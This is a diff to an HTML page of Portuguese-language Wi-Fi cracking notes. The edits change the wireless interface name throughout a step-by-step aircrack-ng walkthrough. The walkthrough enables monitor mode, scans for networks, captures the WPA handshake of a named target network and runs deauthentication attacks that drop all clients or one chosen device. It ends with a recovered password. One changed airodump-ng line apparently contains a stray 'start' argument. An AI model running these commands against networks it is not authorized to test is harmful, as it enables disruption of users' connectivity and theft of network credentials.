@@ -2186,7 +2186,7 @@
 <div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>check<span class="w"> </span><span class="nb">kill</span>
 </code></pre></div>
 <h2 id="coloca-a-placa-de-rede-wi-fi-em-modo-monitoramento">Coloca a placa de rede wi-fi em modo monitoramento:</h2>
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>start<span class="w"> </span>wlan0
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>start<span class="w"> </span>wlp0s20f3
 </code></pre></div>
 <h2 id="valida-o-novo-nome-da-sua-placa-de-captura-de-redes-wi-fi">Valida o novo nome da sua placa de captura de redes wi-fi:</h2>
 <div class="highlight"><pre><span></span><code>ip<span class="w"> </span>-c<span class="w"> </span>addr
@@ -2194,7 +2194,7 @@
 <div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airmon-ng
 </code></pre></div>
 <h2 id="inicia-o-scan-de-todas-as-redes-proximas-aparecerao-diversas-redes">Inicia o scan de todas as redes próximas (aparecerão diversas redes):</h2>
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlan0mon
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>start<span class="w"> </span>wlp0s20f3mon
 </code></pre></div>
 <h2 id="encerra-o-scan-das-redes-apos-escolher-o-alvo">Encerra o scan das redes após escolher o alvo:</h2>
 <div class="highlight"><pre><span></span><code>ctrl+c
@@ -2207,24 +2207,24 @@
 <div class="highlight"><pre><span></span><code><span class="m">4</span>
 </code></pre></div>
 <h2 id="podemos-validar-apenas-a-rede-alvo-se-preferir">Podemos validar apenas a rede alvo, se preferir:</h2>
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlan0mon<span class="w"> </span>-d<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlp0s20f3mon<span class="w"> </span>-d<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E
 </code></pre></div>
 <h2 id="posso-me-conectar-a-rede-wi-fi-alvo-se-for-um-laboratorio-usando-um-celular">Posso me conectar á rede wi-fi alvo, se for um laboratório, usando um celular.</h2>
 <h2 id="vai-constar-o-novo-cliente-com-dados-do-aparelho-definidos-em-station">Vai constar o novo cliente, com dados do aparelho, definidos em STATION.</h2>
 <p><code>TERMINAL 01</code> - VAMOS INICIAR A CAPTURA DOS PACOTES</p>
 <h2 id="subo-o-comando-de-captura-de-pacotes-da-rede-alvo-e-salvo-o-arquivo-de-captura">Subo o comando de captura de pacotes da rede alvo e salvo o arquivo de captura:</h2>
-<p><div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-w<span class="w"> </span>capturados<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span>--bssid<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>wlan0mon
+<p><div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-w<span class="w"> </span>capturados<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span>--bssid<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>wlp0s20f3mon
 </code></pre></div>
 OU
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-w<span class="w"> </span>capturados<span class="w"> </span>--channel<span class="w"> </span><span class="m">2</span><span class="w"> </span>--essid<span class="w"> </span>Condominio_Flores_II<span class="w"> </span>wlan0mon
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-w<span class="w"> </span>capturados<span class="w"> </span>--channel<span class="w"> </span><span class="m">2</span><span class="w"> </span>--essid<span class="w"> </span>Condominio_Flores_II<span class="w"> </span>wlp0s20f3mon
 </code></pre></div></p>
 <p>Á partir daqui, eu aguardo algum dispositivo se conectar para realizar a captura do 4 Way Hand Shake.... OU</p>
 <p><code>TERMINAL 02</code> - VAMOS INICIAR O ATAQUE DE DESAUTENTICAÇÃO</p>
 <h2 id="inicia-o-ataque-ao-roteador-alvo-todos-os-clientes-caem-durante-o-ataque">Inicia o ataque ao roteador alvo (todos os clientes caem durante o ataque):</h2>
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>wlan0mon
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>wlp0s20f3mon
 </code></pre></div>
 <p>Posso tbém, desautenticar apenas um dispositivo específico</p>
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">5</span><span class="w"> </span>-a<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>-c<span class="w"> </span><span class="m">28</span>:6C:07:6F:F9:53<span class="w"> </span>wlan0mon
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">5</span><span class="w"> </span>-a<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>-c<span class="w"> </span><span class="m">28</span>:6C:07:6F:F9:53<span class="w"> </span>wlp0s20f3mon
 </code></pre></div>
 <h2 id="ao-tentar-re-conexao-os-clientes-entregam-o-handshake-de-4-vias-no-terminal-01">Ao tentar re-conexão, os clientes entregam o handshake de 4 vias no TERMINAL 01:</h2>
 <div class="highlight"><pre><span></span><code><span class="o">[</span>WPA<span class="w"> </span>handshake<span class="o">]</span>:<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E
@@ -2258,7 +2258,7 @@ OU
 <div class="highlight"><pre><span></span><code>KEY<span class="w"> </span>FOUNF<span class="w"> </span><span class="o">[</span><span class="w"> </span>P@ssword123<span class="w"> </span><span class="o">]</span>
 </code></pre></div>
 <h2 id="retira-a-placa-de-rede-wi-fi-do-modo-monitoramento">Retira a placa de rede wi-fi do modo monitoramento:</h2>
-<div class="highlight"><pre><span></span><code>airmon-ng<span class="w"> </span>stop<span class="w"> </span>wlan0mon
+<div class="highlight"><pre><span></span><code>airmon-ng<span class="w"> </span>stop<span class="w"> </span>wlp0s20f3mon
 </code></pre></div>
 <h2 id="restaura-sua-placa-de-rede-para-navegacao">Restaura sua placa de rede para navegação:</h2>
 <div class="highlight"><pre><span></span><code>systemctl<span class="w"> </span>restart<span class="w"> </span>NetworkManager
